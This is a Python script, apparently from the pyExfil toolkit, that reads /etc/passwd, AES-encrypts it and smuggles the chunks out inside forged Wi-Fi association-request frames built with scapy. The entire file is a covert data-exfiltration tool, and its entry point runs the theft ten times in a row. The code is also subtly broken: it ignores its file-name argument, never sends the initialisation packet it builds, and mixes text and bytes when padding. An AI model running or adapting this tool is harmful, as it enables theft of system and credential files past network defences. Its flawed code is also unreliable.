import zlib
import time
import hashlib

from scapy.all import *
from Crypto import Random
from Crypto.Cipher import AES


BSSID_NAME = "pyExfil"
MAX_SIZE = 65000
ADAPTER = "en0"
DELIMITER = (
    "\x00\xFF\x00\xFF"  # Using this delimiter since after compression and encryption
)
# chars should not be repeating like this.
ADDR1 = "00:00:00:00:00:42"
ADDR2 = "00:00:00:00:00:42"
ADDR3 = "00:00:00:00:00:42"
TIMEOUT = 0.1


class Dot11EltRates(Packet):
    """ Our own definition for the supported rates field """

    name = "802.11 Rates Information Element"
    # Our Test STA supports the rates 6, 9, 12, 18, 24, 36, 48 and 54 Mbps
    supported_rates = [0x0C, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6C]
    fields_desc = [ByteField("ID", 1), ByteField("len", len(supported_rates))]
    for index, rate in enumerate(supported_rates):
        fields_desc.append(ByteField("supported_rate{0}".format(index + 1), rate))


class AESCipher(object):
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[: AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size :])).decode("utf-8")

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[: -ord(s[len(s) - 1 :])]


def _splitString(stri, length):
    """
    Split a string to specific blocked chunks
    """

    def _f(s, n):
        while s:
            yield s[:n]
            s = s[n:]

    if type(length) is not int:
        sys.stderr.write("'length' parameter must be an int.\n")
        return False
    if type(stri) is not str:
        sys.stderr.write("'stri' parameter must be an string.\n")
        return False
    return list(_f(stri, length))


def _getFile(filepath="", verbosity=False):
    """
    Will read a file from drive.
    :arg filepath: String to file.
    :arg verbosity: Boolean.
    :return: data or False
    """
    if type(verbosity) != bool:
        # Assuming you wanted verbosity but didn't know how...
        verbosity = True
    if filepath == "":
        if verbosity:
            sys.stderr.write("no 'filepath' parameter.\n")
        return False
    if os.path.isfile(filepath):
        try:
            f = open(filepath, "rb")
            data = f.read()
            f.close()
            return data
        except IOError as e:
            if verbosity:
                sys.stderr.write("IOError: %s.\n" % e)
            return False
    else:
        if verbosity:
            sys.stderr.write("File does not exist in path '%s'.\n" % filepath)
        return False


def _sendPacket(data, bssid=BSSID_NAME):
    packet = Dot11(addr1=ADDR1, addr2=ADDR2, addr3=ADDR3)
    packet /= Dot11AssoReq(cap=0x1100, listen_interval=0x00A) / Dot11Elt(
        ID=0, info=bssid
    )
    packet /= Dot11EltRates()
    packet.add_payload(data)
    send(packet, verbose=False)
    return True


def exfiltrate(file_name, key="shut_the_fuck_up_donnie!"):
    data = _getFile("/etc/passwd")
    if data is False:
        sys.exit(1)
    sys.stdout.write("File loaded. Encrypting and preparing for delivery.\n")
    aesObj = AESCipher(key=key)
    enc_data = aesObj.encrypt(data)
    chunksies = _splitString(enc_data, MAX_SIZE)
    digest = hashlib.md5(data).hexdigest()
    packet_cntr = len(chunksies)

    # Build and send initiallaztion packet
    inital_packet = "%s%s%s%s%s" % (
        packet_cntr,
        DELIMITER,
        digest,
        DELIMITER,
        "\x00\x00\x00",
    )  # Making this a split by 3 so easy to know
    # if this is an init or data

    i = 1
    time.sleep(TIMEOUT)
    for chunk in chunksies:
        _sendPacket("%s%s%s" % (i, DELIMITER, chunk))
        sys.stdout.write(".")
        time.sleep(TIMEOUT)
        i += 1
    sys.stdout.write("\nSent out %s packets.\n" % len(chunksies))


if __name__ == "__main__":
    for i in range(0, 10):
        exfiltrate(file_name=".gitignore")
